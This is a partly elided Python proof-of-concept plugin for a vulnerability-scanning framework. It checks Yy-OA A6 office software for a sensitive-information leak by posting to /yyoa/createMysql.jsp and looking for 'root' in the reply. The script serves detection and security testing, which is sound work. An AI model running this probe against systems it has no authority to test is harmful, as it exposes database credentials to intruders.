...
POC_NAME = "YyOAFile"    # PoC脚本中实现的类名，TCC框架将根据POC_NAME去实例化类以达到调用的效果，因此类名应与该变量名保持相同


class YyOAFile(BasePoc):

    poc_info = {
        'poc': {
            'Id': 'vb_2021_0002',    # PoC的VID编号
            'vbid': '',
            'Name': 'Yy-OA A6 Disclosure of sensitive information',    # PoC名称
            'Author': 'mumu',    # PoC作者
        ...
        'vul': {
            ...
            'Version': '',    # 产品的版本号
            'Type': 'Disclosure Of Sensitive Information',    # 漏洞类型
    ...
    def verify(self, first=False):
        ...
        # 以下是PoC的检测逻辑
        url = urljoin(target,'/yyoa/createMysql.jsp')
        headers = {
        ...
        resp = req(url, 'post', headers=headers, allow_redirects=False, timeout=5)
        if resp is not None:
            location = resp.text
        ...
        if "root" in location:
            ...
            if verbose:
                highlight('[+] Yy-OA A6 Disclosure of sensitive information found')    # 打印高亮信息发现漏洞，其他可用方法包括info()/warn()/error()/highlight()方法分别打印不同等级的信息
        else:
            if verbose:
                highlight('[+] Yy-OA A6 Disclosure of sensitive information not found')    # 打印高亮信息发现漏洞，其他可用方法包括info()/warn()/error()/highlight()方法分别打印不同等级的信息
